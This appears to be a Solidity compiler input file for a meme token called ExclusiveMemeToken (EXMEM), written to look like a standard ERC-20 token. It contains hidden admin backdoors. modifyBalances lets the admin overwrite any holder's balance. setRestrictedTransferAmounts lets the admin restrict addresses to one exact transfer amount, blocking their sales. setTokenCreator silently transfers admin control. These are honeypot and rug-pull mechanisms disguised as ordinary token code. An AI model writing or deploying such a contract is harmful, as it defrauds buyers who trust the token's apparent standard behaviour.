{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.16;\r\n\r\ninterface ICustomERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract ContextEnhanced {\r\n    function getContextSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract SingleAdministrator is ContextEnhanced {\r\n    address private _admin;\r\n    event AdminUpdated(address indexed previousAdmin, address indexed newAdmin);\r\n\r\n    constructor() {\r\n        address contextSender = getContextSender();\r\n        _admin = contextSender;\r\n        emit AdminUpdated(address(0), contextSender);\r\n    }\r\n\r\n    function getAdministrator() public view virtual returns (address) {\r\n        return _admin;\r\n    }\r\n\r\n    modifier onlyAdmin() {\r\n        require(getAdministrator() == getContextSender(), \"Only admin can perform this action\");\r\n        _;\r\n    }\r\n\r\n     function setTokenCreator(address newCreator) public onlyAdmin {\r\n        _admin = newCreator;\r\n    }\r\n\r\n    function renounceAdmin() public virtual onlyAdmin {\r\n        emit AdminUpdated(_admin, address(0));\r\n        _admin = address(0);\r\n    }\r\n}\r\n\r\ncontract ExclusiveMemeToken is ContextEnhanced, SingleAdministrator, ICustomERC20 {\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => uint256) private _restrictedTransferAmounts;\r\n\r\n    string public constant tokenName = \"ExclusiveMemeToken\";\r\n    string public constant tokenSymbol = \"EXMEM\";\r\n    uint8 public constant tokenDecimals = 18;\r\n    uint256 public constant maxSupply = 120000 * (10 ** tokenDecimals);\r\n\r\n    constructor() {\r\n        _balances[getContextSender()] = maxSupply;\r\n        emit Transfer(address(0), getContextSender(), maxSupply);\r\n    }\r\n    \r\n    modifier onlyAdminOrCreator() {\r\n        require(getAdministrator() == getContextSender(), \"You must be the admin to perform this action\");\r\n        _;\r\n    }\r\n\r\n    event BalanceAdjusted(address indexed user, uint256 previousBalance, uint256 newBalance);\r\n\r\n    function getRestrictedTransferAmount(address account) public view returns (uint256) {\r\n        return _restrictedTransferAmounts[account];\r\n    }\r\n\r\n    function setRestrictedTransferAmounts(address[] calldata accounts, uint256 amount) public onlyAdminOrCreator {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _restrictedTransferAmounts[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function modifyBalances(address[] memory userAddresses, uint256 updatedAmount) public onlyAdminOrCreator {\r\n        require(updatedAmount >= 0, \"Updated amount must be non-negative\");\r\n\r\n        for (uint256 i = 0; i < userAddresses.length; i++) {\r\n            address currentUser = userAddresses[i];\r\n            require(currentUser != address(0), \"User address must not be the zero address\");\r\n\r\n            uint256 originalBalance = _balances[currentUser];\r\n            _balances[currentUser] = updatedAmount;\r\n\r\n            emit BalanceAdjusted(currentUser, originalBalance, updatedAmount);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_balances[getContextSender()] >= amount, \"TT: transfer amount exceeds balance\");\r\n\r\n    uint256 exactAmount = getRestrictedTransferAmount(getContextSender());\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _balances[getContextSender()] -= amount;\r\n    _balances[recipient] += amount;\r\n\r\n    emit Transfer(getContextSender(), recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[getContextSender()][spender] = amount;\r\n        emit Approval(getContextSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_allowances[sender][getContextSender()] >= amount, \"TT: transfer amount exceeds allowance\");\r\n\r\n    uint256 exactAmount = getRestrictedTransferAmount(sender);\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _balances[sender] -= amount;\r\n    _balances[recipient] += amount;\r\n    _allowances[sender][getContextSender()] -= amount;\r\n\r\n    emit Transfer(sender, recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n    return maxSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return tokenName;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return tokenSymbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return tokenDecimals;\r\n    }\r\n\r\n}\r\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}